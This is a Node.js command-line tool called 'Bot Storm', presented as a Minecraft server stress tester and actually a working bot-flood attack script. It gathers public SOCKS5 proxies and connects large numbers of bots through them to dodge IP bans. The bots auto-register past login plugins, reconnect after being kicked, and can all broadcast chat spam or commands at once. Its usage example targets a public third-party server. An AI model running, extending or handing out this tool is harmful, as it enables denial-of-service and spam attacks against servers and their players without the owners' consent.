#!/usr/bin/env node

import { spawn, execSync } from 'child_process';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import { existsSync, mkdirSync, writeFileSync, readFileSync, appendFileSync } from 'fs';
import readline from 'readline';
import https from 'https';
import net from 'net';
import chalk from 'chalk';
import gradient from 'gradient-string';
import figlet from 'figlet';
import ora from 'ora';
import boxen from 'boxen';
import Table from 'cli-table3';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Auto-install dependencies
async function checkAndInstallDependencies() {
    const requiredPackages = [
        'mineflayer', 'socks', 'chalk', 'gradient-string', 
        'figlet', 'ora', 'boxen', 'cli-table3', 'minecraft-protocol'
    ];
    const missingPackages = [];

    for (const pkg of requiredPackages) {
        try {
            await import(pkg);
        } catch {
            missingPackages.push(pkg);
        }
    }

    if (missingPackages.length > 0) {
        console.log(chalk.yellow('📦 Installing missing packages...'));
        try {
            execSync(`pnpm add ${missingPackages.join(' ')}`, { stdio: 'inherit' });
            console.log(chalk.green('✅ Dependencies installed successfully!\n'));
        } catch (error) {
            console.error(chalk.red('❌ Failed to install dependencies. Please run: pnpm install'));
            process.exit(1);
        }
    }
}

await checkAndInstallDependencies();

// Now import the modules
const mineflayer = (await import('mineflayer')).default;
const { SocksClient } = await import('socks');
const mc = await import('minecraft-protocol');

// Create necessary directories
const DIRS = {
    base: join(__dirname, 'bot-data'),
    logs: join(__dirname, 'bot-data', 'logs'),
    proxies: join(__dirname, 'bot-data', 'proxies'),
    configs: join(__dirname, 'bot-data', 'configs'),
    scripts: join(__dirname, 'bot-data', 'scripts')
};

Object.values(DIRS).forEach(dir => {
    if (!existsSync(dir)) {
        mkdirSync(dir, { recursive: true });
    }
});

// Global state
let serverInfo = null;
let isRunning = true;
let currentPhase = 'INITIALIZING';

// Cool ASCII art title
function showTitle() {
    console.clear();
    const title = figlet.textSync('BOT STORM', {
        font: 'ANSI Shadow',
        horizontalLayout: 'full'
    });
    console.log(gradient.rainbow(title));
    console.log(chalk.gray('═'.repeat(80)));
    console.log(chalk.cyan('⚡ Ultimate Minecraft Server Stress Tester v3.0'));
    console.log(chalk.gray('═'.repeat(80) + '\n'));
}

// Enhanced stats tracking
const stats = {
    sent: 0,
    joined: 0,
    kicked: 0,
    timeout: 0,
    failed: 0,
    proxiesFound: 0,
    proxiesWorking: 0,
    messagesSent: 0,
    commandsExecuted: 0,
    uptime: Date.now(),
    reconnects: 0
};

// Server status checker
async function checkServerStatus(host, port) {
    return new Promise((resolve) => {
        const spinner = ora({
            text: `Checking server ${host}:${port}...`,
            color: 'cyan',
            spinner: 'dots'
        }).start();

        const client = mc.default.createClient({
            host: host,
            port: port,
            username: 'ping',
            version: false
        });

        client.on('server_info', (packet) => {
            spinner.succeed(chalk.green(`✅ Server is ONLINE`));
            
            const result = {
                description: packet.description,
                version: packet.version,
                players: packet.players,
                latency: Date.now() - client.startTime
            };
            
            // Display server info
            const infoBox = boxen(
                chalk.cyan('🎮 SERVER INFORMATION\n\n') +
                `${chalk.white('MOTD:')} ${typeof result.description === 'object' ? result.description.text : result.description}\n` +
                `${chalk.white('Version:')} ${result.version.name}\n` +
                `${chalk.white('Protocol:')} ${result.version.protocol}\n` +
                `${chalk.white('Players:')} ${result.players.online}/${result.players.max}\n` +
                `${chalk.white('Latency:')} ${result.latency}ms`,
                {
                    padding: 1,
                    borderStyle: 'double',
                    borderColor: 'green'
                }
            );
            
            console.log(infoBox);
            serverInfo = result;
            client.end();
            resolve(true);
        });

        client.on('error', (err) => {
            spinner.fail(chalk.red(`❌ Server is OFFLINE or unreachable`));
            console.log(chalk.yellow(`Error: ${err.message}`));
            resolve(false);
        });
    });
}

// Display enhanced stats
function displayStats() {
    const uptime = Math.floor((Date.now() - stats.uptime) / 1000);
    const uptimeStr = `${Math.floor(uptime / 60)}m ${uptime % 60}s`;
    
    const statsTable = new Table({
        chars: {
            'top': '═', 'top-mid': '╤', 'top-left': '╔', 'top-right': '╗',
            'bottom': '═', 'bottom-mid': '╧', 'bottom-left': '╚', 'bottom-right': '╝',
            'left': '║', 'left-mid': '╟', 'mid': '─', 'mid-mid': '┼',
            'right': '║', 'right-mid': '╢', 'middle': '│'
        },
        style: { head: ['cyan'], border: ['gray'] },
        colWidths: [20, 10, 20, 10]
    });

    statsTable.push(
        [{ colSpan: 4, content: chalk.yellow.bold('📊 LIVE STATISTICS'), hAlign: 'center' }],
        [
            chalk.green('✅ Joined'), chalk.bold(stats.joined),
            chalk.red('❌ Failed'), chalk.bold(stats.failed)
        ],
        [
            chalk.blue('📤 Sent'), chalk.bold(stats.sent),
            chalk.red('🚫 Kicked'), chalk.bold(stats.kicked)
        ],
        [
            chalk.yellow('⏱ Timeout'), chalk.bold(stats.timeout),
            chalk.magenta('🌐 Proxies'), chalk.bold(`${stats.proxiesWorking}/${stats.proxiesFound}`)
        ],
        [
            chalk.cyan('💬 Messages'), chalk.bold(stats.messagesSent),
            chalk.green('⚡ Commands'), chalk.bold(stats.commandsExecuted)
        ],
        [
            chalk.blue('🔄 Reconnects'), chalk.bold(stats.reconnects),
            chalk.white('⏰ Uptime'), chalk.bold(uptimeStr)
        ]
    );

    process.stdout.write('\x1B[12;0H' + statsTable.toString());
}

// Fetch proxies with progress
async function fetchProxiesWithProgress() {
    const spinner = ora({
        text: 'Fetching proxy lists...',
        color: 'cyan',
        spinner: 'dots'
    }).start();

    const urls = [
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
        'https://www.proxy-list.download/api/v1/get?type=socks5',
        'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
        'https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt',
        'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt'
    ];

    let allProxies = [];

    for (const [index, url] of urls.entries()) {
        spinner.text = `Fetching proxy list ${index + 1}/${urls.length}...`;
        try {
            const proxies = await fetchFromUrl(url);
            allProxies.push(...proxies);
        } catch {
            // Skip failed sources
        }
    }

    allProxies = [...new Set(allProxies)];
    stats.proxiesFound = allProxies.length;
    
    spinner.succeed(chalk.green(`✅ Found ${allProxies.length} unique proxies`));
    
    // Save proxies to file
    const proxyFile = join(DIRS.proxies, `proxies_${Date.now()}.txt`);
    writeFileSync(proxyFile, allProxies.join('\n'));
    
    return allProxies;
}

function fetchFromUrl(url) {
    return new Promise((resolve, reject) => {
        https.get(url, response => {
            let data = '';
            response.on('data', chunk => data += chunk);
            response.on('end', () => {
                const proxies = data.split('\n')
                    .filter(line => line.includes(':'))
                    .map(line => line.trim())
                    .filter(line => /^\d+\.\d+\.\d+\.\d+:\d+$/.test(line));
                resolve(proxies);
            });
        }).on('error', reject);
    });
}

// Test proxy with better error handling
async function testProxy(proxy, host, port, timeout = 3000) {
    const [proxyHost, proxyPort] = proxy.split(':');
    
    try {
        const connection = await SocksClient.createConnection({
            proxy: {
                host: proxyHost,
                port: parseInt(proxyPort),
                type: 5
            },
            command: 'connect',
            destination: { host, port },
            timeout
        });
        
        connection.socket.destroy();
        return true;
    } catch {
        return false;
    }
}

// Generate random usernames
function generateUsername() {
    const prefixes = ['Storm', 'Thunder', 'Lightning', 'Shadow', 'Phantom', 'Ghost', 'Ninja', 'Dragon'];
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    return prefix + Math.floor(Math.random() * 99999);
}

// Save log
function saveLog(message, type = 'info') {
    const timestamp = new Date().toISOString();
    const logFile = join(DIRS.logs, `session_${new Date().toISOString().split('T')[0]}.log`);
    appendFileSync(logFile, `[${timestamp}] [${type.toUpperCase()}] ${message}\n`);
}

// Ultra Enhanced Bot Class
class UltraBot {
    constructor({ host, port, username, version, proxy, index, onReconnect }) {
        this.host = host;
        this.port = port;
        this.username = username;
        this.version = version;
        this.proxy = proxy;
        this.index = index;
        this.connected = false;
        this.messages = [];
        this.position = null;
        this.health = 20;
        this.food = 20;
        this.onReconnect = onReconnect;
        this.reconnectAttempts = 0;
        this.maxReconnects = 3;
        
        this.connect();
    }
    
    connect() {
        const options = {
            host: this.host,
            port: this.port,
            username: this.username,
            version: this.version,
            hideErrors: true,
            checkTimeoutInterval: 30000,
            keepAlive: true
        };
        
        if (this.proxy) {
            const [proxyHost, proxyPort] = this.proxy.split(':');
            options.connect = (client) => {
                return SocksClient.createConnection({
                    proxy: {
                        host: proxyHost,
                        port: parseInt(proxyPort),
                        type: 5
                    },
                    command: 'connect',
                    destination: { host: this.host, port: this.port }
                }).then(connection => {
                    client.setSocket(connection.socket);
                    client.emit('connect');
                }).catch(() => {
                    stats.failed++;
                    displayStats();
                });
            };
        }
        
        try {
            this.bot = mineflayer.createBot(options);
            stats.sent++;
            displayStats();
            this.setupListeners();
        } catch (error) {
            stats.failed++;
            displayStats();
            saveLog(`Bot ${this.index} failed to create: ${error.message}`, 'error');
        }
    }
    
    setupListeners() {
        this.bot.on('login', () => {
            this.connected = true;
            stats.joined++;
            displayStats();
            this.log(chalk.green('✅ Connected!'));
            saveLog(`Bot ${this.index} (${this.username}) connected`, 'success');
            
            // Reset reconnect attempts on successful connection
            this.reconnectAttempts = 0;
        });
        
        this.bot.on('spawn', () => {
            this.log(chalk.blue('🏃 Spawned in world'));
            this.position = this.bot.entity.position;
            
            // Random movement after spawn
            setTimeout(() => this.randomAction(), 5000);
        });
        
        this.bot.on('health', () => {
            this.health = this.bot.health;
            this.food = this.bot.food;
            
            if (this.health < 10) {
                this.log(chalk.yellow(`⚠️ Low health: ${this.health}`));
            }
        });
        
        this.bot.on('kicked', (reason) => {
            this.connected = false;
            stats.kicked++;
            displayStats();
            this.log(chalk.red(`🚫 Kicked: ${reason}`));
            saveLog(`Bot ${this.index} kicked: ${reason}`, 'warn');
            
            this.attemptReconnect();
        });
        
        this.bot.on('end', (reason) => {
            this.connected = false;
            stats.timeout++;
            displayStats();
            this.log(chalk.yellow(`⏱ Connection ended: ${reason || 'Unknown'}`));
            
            this.attemptReconnect();
        });
        
        this.bot.on('error', (err) => {
            this.log(chalk.red(`❌ Error: ${err.message}`));
            saveLog(`Bot ${this.index} error: ${err.message}`, 'error');
        });
        
        this.bot.on('message', (message) => {
            const text = message.toString();
            this.messages.push(text);
            
            // Display important messages
            if (text.toLowerCase().includes(this.username.toLowerCase())) {
                this.log(chalk.magenta(`💬 Mentioned: ${text}`));
            }
            
            // Auto-respond to common auth plugins
            if (text.includes('/register')) {
                const password = this.username.split('').reverse().join('');
                this.bot.chat(`/register ${password} ${password}`);
                this.log(chalk.magenta('🔐 Registering...'));
            }
            
            if (text.includes('/login')) {
                const password = this.username.split('').reverse().join('');
                this.bot.chat(`/login ${password}`);
                this.log(chalk.magenta('🔑 Logging in...'));
            }
            
            // AuthMe support
            if (text.includes('Please, login with the command')) {
                const password = this.username.split('').reverse().join('');
                this.bot.chat(`/login ${password}`);
            }
            
            // Premium check
            if (text.includes('premium')) {
                this.bot.chat('/nlogin');
                this.log(chalk.magenta('💎 Premium check...'));
            }
        });
        
        // Anti-AFK
        this.bot.on('physicsTick', () => {
            if (Math.random() < 0.001 && this.connected) { // 0.1% chance per tick
                this.randomAction();
            }
        });
    }
    
    randomAction() {
        if (!this.connected || !this.bot.entity) return;
        
        const actions = [
            () => this.bot.setControlState('jump', true),
            () => this.bot.setControlState('jump', false),
            () => this.bot.look(Math.random() * Math.PI * 2, 0),
            () => {
                const direction = ['forward', 'back', 'left', 'right'][Math.floor(Math.random() * 4)];
                this.bot.setControlState(direction, true);
                setTimeout(() => this.bot.setControlState(direction, false), 1000);
            }
        ];
        
        const action = actions[Math.floor(Math.random() * actions.length)];
        action();
    }
    
    attemptReconnect() {
        if (this.reconnectAttempts >= this.maxReconnects) {
            this.log(chalk.red('❌ Max reconnect attempts reached'));
            return;
        }
        
        this.reconnectAttempts++;
        stats.reconnects++;
        
        const delay = Math.min(5000 * this.reconnectAttempts, 30000);
        this.log(chalk.yellow(`🔄 Reconnecting in ${delay/1000}s... (Attempt ${this.reconnectAttempts}/${this.maxReconnects})`));
        
        setTimeout(() => {
            if (isRunning) {
                this.connect();
            }
        }, delay);
    }
    
    log(message) {
        const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
        console.log(chalk.gray(`[${timestamp}]`) + ` ${chalk.cyan(`Bot${this.index}`)} ${message}`);
    }
    
    sendChat(message) {
        if (this.bot && this.connected) {
            this.bot.chat(message);
            stats.messagesSent++;
            displayStats();
        }
    }
    
    executeCommand(command) {
        if (this.bot && this.connected) {
            this.bot.chat(command);
            stats.commandsExecuted++;
            displayStats();
            this.log(chalk.blue(`⚡ Executed: ${command}`));
        }
    }
    
    getInfo() {
        return {
            index: this.index,
            username: this.username,
            connected: this.connected,
            position: this.position,
            health: this.health,
            food: this.food,
            proxy: this.proxy ? '✓' : '✗',
            messages: this.messages.length
        };
    }
    
    disconnect() {
        if (this.bot) {
            this.bot.quit();
            this.connected = false;
        }
    }
}

// Enhanced Command Interface
class UltraCommandInterface {
    constructor() {
        this.rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout,
            prompt: gradient.cristal('\n► ')
        });
        
        this.bots = [];
        this.commandHistory = [];
        this.macros = new Map();
        
        this.loadMacros();
    }
    
    loadMacros() {
        // Pre-defined macros
        this.macros.set('joinserver', ['/server survival', '/server skyblock']);
        this.macros.set('spam', ['Hello!', 'How are you?', 'Nice server!']);
    }
    
    start() {
        this.rl.prompt();
        
        this.rl.on('line', (line) => {
            if (line.trim()) {
                this.commandHistory.push(line);
                this.processCommand(line.trim());
            }
            this.rl.prompt();
        });
        
        // Auto-refresh stats
        setInterval(() => {
            if (currentPhase === 'RUNNING') {
                displayStats();
            }
        }, 1000);
    }
    
    processCommand(input) {
        const [command, ...args] = input.split(' ');
        
        switch (command.toLowerCase()) {
            case 'help':
            case '?':
                this.showHelp();
                break;
                
            case 'say':
            case 'chat':
                this.broadcast(args.join(' '));
                break;
                
            case 'cmd':
            case 'command':
                this.executeCommand(args.join(' '));
                break;
                
            case 'stats':
                displayStats();
                break;
                
            case 'list':
            case 'bots':
                this.listBots();
                break;
                
            case 'info':
                this.showBotInfo(args[0]);
                break;
                
            case 'macro':
                this.executeMacro(args[0]);
                break;
                
            case 'clear':
                showTitle();
                displayStats();
                break;
                
            case 'stop':
                this.stopAll();
                break;
                
            case 'exit':
            case 'quit':
                this.exit();
                break;
                
            default:
                if (input.startsWith('/')) {
                    this.executeCommand(input);
                } else {
                    this.broadcast(input);
                }
        }
    }
    
    showHelp() {
        const helpTable = new Table({
            head: [chalk.yellow('Command'), chalk.yellow('Description')],
            style: { head: [], border: ['gray'] }
        });
        
        helpTable.push(
            ['say <message>', 'Broadcast a chat message to all bots'],
            ['cmd <command>', 'Execute a command on all bots (e.g., cmd /skyblock)'],
            ['list', 'Show all connected bots'],
            ['info <index>', 'Show detailed info about a specific bot'],
            ['macro <name>', 'Execute a predefined macro'],
            ['stats', 'Show current statistics'],
            ['clear', 'Clear screen and refresh display'],
            ['stop', 'Disconnect all bots'],
            ['exit', 'Exit the program'],
            ['', ''],
            [chalk.gray('Direct Input'), chalk.gray('Type message to broadcast or /command to execute')]
        );
        
        console.log('\n' + helpTable.toString());
    }
    
    broadcast(message) {
        if (!message) return;
        
        let sent = 0;
        this.bots.forEach(bot => {
            if (bot.connected) {
                bot.sendChat(message);
                sent++;
            }
        });
        
        console.log(chalk.green(`\n📢 Broadcasted to ${sent} bots: ${message}`));
        saveLog(`Broadcasted: ${message} (to ${sent} bots)`, 'info');
    }
    
    executeCommand(command) {
        if (!command) return;
        
        let executed = 0;
        this.bots.forEach(bot => {
            if (bot.connected) {
                bot.executeCommand(command);
                executed++;
            }
        });
        
        console.log(chalk.blue(`\n⚡ Executed on ${executed} bots: ${command}`));
        saveLog(`Command executed: ${command} (on ${executed} bots)`, 'info');
    }
    
    listBots() {
        const botTable = new Table({
            head: [
                chalk.cyan('#'),
                chalk.cyan('Username'),
                chalk.cyan('Status'),
                chalk.cyan('Health'),
                chalk.cyan('Proxy'),
                chalk.cyan('Messages')
            ],
            style: { head: [], border: ['gray'] }
        });
        
        this.bots.forEach(bot => {
            const info = bot.getInfo();
            botTable.push([
                info.index,
                info.username,
                info.connected ? chalk.green('✓') : chalk.red('✗'),
                `${info.health}/20`,
                info.proxy,
                info.messages
            ]);
        });
        
        console.log('\n' + botTable.toString());
    }
    
    showBotInfo(index) {
        const bot = this.bots.find(b => b.index === parseInt(index));
        if (!bot) {
            console.log(chalk.red('\n❌ Bot not found'));
            return;
        }
        
        const info = bot.getInfo();
        const infoBox = boxen(
            chalk.cyan(`🤖 BOT ${info.index} INFORMATION\n\n`) +
            `${chalk.white('Username:')} ${info.username}\n` +
            `${chalk.white('Connected:')} ${info.connected ? chalk.green('Yes') : chalk.red('No')}\n` +
            `${chalk.white('Health:')} ${info.health}/20\n` +
            `${chalk.white('Food:')} ${info.food}/20\n` +
            `${chalk.white('Position:')} ${info.position ? `${Math.floor(info.position.x)}, ${Math.floor(info.position.y)}, ${Math.floor(info.position.z)}` : 'Unknown'}\n` +
            `${chalk.white('Messages:')} ${info.messages}`,
            {
                padding: 1,
                borderStyle: 'round',
                borderColor: 'cyan'
            }
        );
        
        console.log('\n' + infoBox);
    }
    
    executeMacro(name) {
        const macro = this.macros.get(name);
        if (!macro) {
            console.log(chalk.red(`\n❌ Macro '${name}' not found`));
            return;
        }
        
        console.log(chalk.magenta(`\n🎯 Executing macro '${name}'...`));
        macro.forEach((cmd, index) => {
            setTimeout(() => {
                if (cmd.startsWith('/')) {
                    this.executeCommand(cmd);
                } else {
                    this.broadcast(cmd);
                }
            }, index * 1000);
        });
    }
    
    stopAll() {
        console.log(chalk.yellow('\n🛑 Stopping all bots...'));
        isRunning = false;
        this.bots.forEach(bot => bot.disconnect());
        this.bots = [];
        
        // Final statistics
        setTimeout(() => {
            this.showFinalStats();
        }, 1000);
    }
    
    showFinalStats() {
        const runtime = Math.floor((Date.now() - stats.uptime) / 1000);
        const finalBox = boxen(
            chalk.yellow('📊 FINAL SESSION STATISTICS\n\n') +
            `${chalk.white('Total Runtime:')} ${Math.floor(runtime / 60)}m ${runtime % 60}s\n` +
            `${chalk.white('Bots Sent:')} ${stats.sent}\n` +
            `${chalk.white('Successful Joins:')} ${stats.joined}\n` +
            `${chalk.white('Failed Connections:')} ${stats.failed}\n` +
            `${chalk.white('Kicked/Banned:')} ${stats.kicked}\n` +
            `${chalk.white('Timeouts:')} ${stats.timeout}\n` +
            `${chalk.white('Reconnects:')} ${stats.reconnects}\n` +
            `${chalk.white('Messages Sent:')} ${stats.messagesSent}\n` +
            `${chalk.white('Commands Executed:')} ${stats.commandsExecuted}\n` +
            `${chalk.white('Working Proxies:')} ${stats.proxiesWorking}/${stats.proxiesFound}`,
            {
                padding: 1,
                borderStyle: 'double',
                borderColor: 'yellow',
                title: chalk.bold('Session Complete'),
                titleAlignment: 'center'
            }
        );
        
        console.log('\n' + finalBox);
        saveLog('Session ended', 'info');
    }
    
    exit() {
        this.stopAll();
        setTimeout(() => {
            console.log(gradient.rainbow('\n\n✨ Thanks for using Bot Storm! ✨\n'));
            process.exit(0);
        }, 2000);
    }
}

// Main function
async function main() {
    showTitle();
    
    // Get server details
    const args = process.argv.slice(2);
    if (args.length < 2) {
        console.log(boxen(
            chalk.yellow('Usage:') + ' node botattack.js <host:port> <version> [maxBots] [delay]\n\n' +
            chalk.gray('Examples:\n') +
            chalk.green('  node botattack.js localhost:25565 1.20.1 10 3000\n') +
            chalk.green('  node botattack.js play.hypixel.net 1.8.9 50 2000\n\n') +
            chalk.cyan('Popular Versions:\n') +
            '  1.8.9  - Old PvP servers\n' +
            '  1.12.2 - Modded servers\n' +
            '  1.16.5 - Stable modern\n' +
            '  1.19.4 - Recent stable\n' +
            '  1.20.1 - Latest features',
            {
                padding: 1,
                borderStyle: 'round',
                borderColor: 'yellow',
                title: chalk.bold('Bot Storm v3.0'),
                titleAlignment: 'center'
            }
        ));
        process.exit(0);
    }
    
    const [hostPort, version, maxBots = '10', delay = '3000'] = args;
    const [host, port] = hostPort.includes(':') 
        ? hostPort.split(':') 
        : [hostPort, '25565'];
    
    const config = {
        host,
        port: parseInt(port),
        version,
        maxBots: parseInt(maxBots),
        delay: parseInt(delay)
    };
    
    // Save session config
    const sessionConfig = {
        ...config,
        timestamp: new Date().toISOString()
    };
    writeFileSync(
        join(DIRS.configs, `session_${Date.now()}.json`), 
        JSON.stringify(sessionConfig, null, 2)
    );
    
    console.log(boxen(
        chalk.cyan('🎮 TARGET SERVER\n\n') +
        `${chalk.white('Host:')} ${config.host}:${config.port}\n` +
        `${chalk.white('Version:')} ${config.version}\n` +
        `${chalk.white('Max Bots:')} ${config.maxBots}\n` +
        `${chalk.white('Spawn Delay:')} ${config.delay}ms`,
        {
            padding: 1,
            borderStyle: 'double',
            borderColor: 'cyan'
        }
    ));
    
    // Check server status
    console.log('\n' + chalk.yellow('🔍 Checking Server Status...'));
    const isOnline = await checkServerStatus(config.host, config.port);
    
    if (!isOnline) {
        const offlineBox = boxen(
            chalk.red('❌ SERVER IS OFFLINE\n\n') +
            chalk.yellow('The server is not responding. Please check:\n') +
            '• Server address and port are correct\n' +
            '• Server is running and accessible\n' +
            '• Firewall is not blocking the connection\n' +
            '• You have internet connectivity',
            {
                padding: 1,
                borderStyle: 'round',
                borderColor: 'red',
                title: chalk.bold('Connection Failed'),
                titleAlignment: 'center'
            }
        );
        
        console.log('\n' + offlineBox);
        console.log(chalk.gray('\nExiting...'));
        process.exit(1);
    }
    
    // Continue with bot spawning
    currentPhase = 'PROXY_SETUP';
    
    // Fetch and test proxies
    console.log('\n' + chalk.yellow('🌐 Proxy Setup'));
    const allProxies = await fetchProxiesWithProgress();
    
    // Test proxies with better progress
    const spinner = ora({
        text: `Testing ${allProxies.length} proxies...`,
        color: 'yellow',
        spinner: 'dots'
    }).start();
    
    const workingProxies = [];
    const proxyBatches = [];
    const batchSize = 100;
    
    for (let i = 0; i < allProxies.length; i += batchSize) {
        proxyBatches.push(allProxies.slice(i, i + batchSize));
    }
    
    for (const [batchIndex, batch] of proxyBatches.entries()) {
        spinner.text = `Testing proxy batch ${batchIndex + 1}/${proxyBatches.length} (Found: ${workingProxies.length})...`;
        
        const tests = batch.map(proxy => 
            testProxy(proxy, config.host, config.port).then(works => {
                if (works && workingProxies.length < config.maxBots * 2) { // Get extra proxies
                    workingProxies.push(proxy);
                    stats.proxiesWorking = workingProxies.length;
                }
            })
        );
        
        await Promise.allSettled(tests);
        
        if (workingProxies.length >= config.maxBots * 2) break;
    }
    
    spinner.succeed(chalk.green(`✅ Found ${workingProxies.length} working proxies`));
    
    // Save working proxies
    const workingProxyFile = join(DIRS.proxies, `working_${config.host}_${Date.now()}.txt`);
    writeFileSync(workingProxyFile, workingProxies.join('\n'));
    
    // Warning if not enough proxies
    if (workingProxies.length < config.maxBots) {
        console.log(chalk.yellow(`\n⚠️  Warning: Only found ${workingProxies.length} working proxies for ${config.maxBots} bots`));
        console.log(chalk.gray('Some bots will connect without proxies'));
    }
    
    // Start spawning bots
    currentPhase = 'RUNNING';
    console.log('\n' + chalk.yellow('🚀 Starting Bot Attack'));
    console.log(chalk.gray('Type "help" for available commands\n'));
    
    displayStats();
    
    const cmdInterface = new UltraCommandInterface();
    let botIndex = 0;
    
    function spawnBot() {
        if (!isRunning || botIndex >= config.maxBots) {
            if (botIndex >= config.maxBots) {
                console.log(chalk.green('\n✅ All bots spawned! Ready for commands.'));
                
                // Show quick help
                setTimeout(() => {
                    console.log(chalk.gray('\nQuick commands:'));
                    console.log(chalk.gray('  • Type any message to chat'));
                    console.log(chalk.gray('  • Type /command to execute'));
                    console.log(chalk.gray('  • Type "help" for all commands'));
                }, 1000);
            }
            return;
        }
        
        const username = generateUsername();
        const proxy = workingProxies[botIndex % workingProxies.length] || null;
        
        const bot = new UltraBot({
            host: config.host,
            port: config.port,
            username,
            version: config.version,
            proxy,
            index: botIndex + 1,
            onReconnect: () => stats.reconnects++
        });
        
        cmdInterface.bots.push(bot);
        botIndex++;
        
        // Animated progress bar
        const progress = Math.floor((botIndex / config.maxBots) * 30);
        const progressBar = chalk.green('█'.repeat(progress)) + chalk.gray('░'.repeat(30 - progress));
        const percentage = Math.floor((botIndex / config.maxBots) * 100);
        
        process.stdout.write(
            `\r${chalk.cyan('Spawning:')} [${progressBar}] ${chalk.bold(percentage + '%')} (${botIndex}/${config.maxBots})`
        );
        
        if (botIndex < config.maxBots) {
            setTimeout(spawnBot, config.delay);
        }
    }
    
    // Start bot spawning
    setTimeout(spawnBot, 1000);
    
    // Start command interface
    cmdInterface.start();
}

// Global error handling
process.on('uncaughtException', (error) => {
    console.error(chalk.red('\n❌ Uncaught Exception:'), error.message);
    saveLog(`Uncaught exception: ${error.message}`, 'error');
});

process.on('unhandledRejection', (reason, promise) => {
    console.error(chalk.red('\n❌ Unhandled Rejection:'), reason);
    saveLog(`Unhandled rejection: ${reason}`, 'error');
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log(chalk.yellow('\n\n🛑 Shutting down gracefully...'));
    isRunning = false;
    process.exit(0);
});

// Start the application
main().catch(error => {
    console.error(chalk.red('\n❌ Fatal Error:'), error);
    process.exit(1);
});